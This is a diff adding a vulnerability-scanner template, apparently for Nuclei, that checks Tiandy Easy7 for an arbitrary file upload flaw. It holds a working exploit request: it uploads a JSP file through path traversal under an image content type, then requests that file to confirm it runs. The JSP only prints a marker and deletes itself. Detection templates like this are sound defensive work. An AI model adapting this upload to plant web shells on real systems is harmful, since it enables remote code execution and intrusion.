@@ -1,0 +1,56 @@
+id: tiandy-easy7-uploadmapserverbgimage-fileupload
+
+info:
+  name: Tiandy Easy7 uploadMapServerBgImage Arbitrary File Upload
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: file-upload
+  description: |
+    Tiandy Easy7 Comprehensive Management Platform contains a vulnerability in the uploadMapServerBgImage endpoint, allowing arbitrary file upload that can lead to remote code execution.
+
+variables:
+  t1: "{{rand_base(7)}}"
+  t2: "{{base64(t1)}}"
+
+http:
+  - id: upload-file
+    method: POST
+    path:
+      - "{{BaseURL}}/Easy7/rest/file/uploadMapServerBgImage"
+    headers:
+      Content-Type: "multipart/form-data; boundary=----WebKitFormBoundaryFfJZ4PlAZBixjELj"
+    body: |-
+      ------WebKitFormBoundaryFfJZ4PlAZBixjELj
+      Content-Disposition: form-data; name="uploadParams";
+
+      [{"path":"../Easy7/","name":"{{t1}}.jsp"}]
+      ------WebKitFormBoundaryFfJZ4PlAZBixjELj
+      Content-Disposition: form-data; name="file"; filename="{{t1}}.jsp"
+      Content-Type: image/jpeg
+
+      <% out.print("{{t2}}");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
+      ------WebKitFormBoundaryFfJZ4PlAZBixjELj--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "<textarea>"
+          - "\"content\":"
+
+  - id: verify-file
+    method: GET
+    path:
+      - "{{BaseURL}}/Easy7/{{t1}}.jsp"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "{{t2}}"
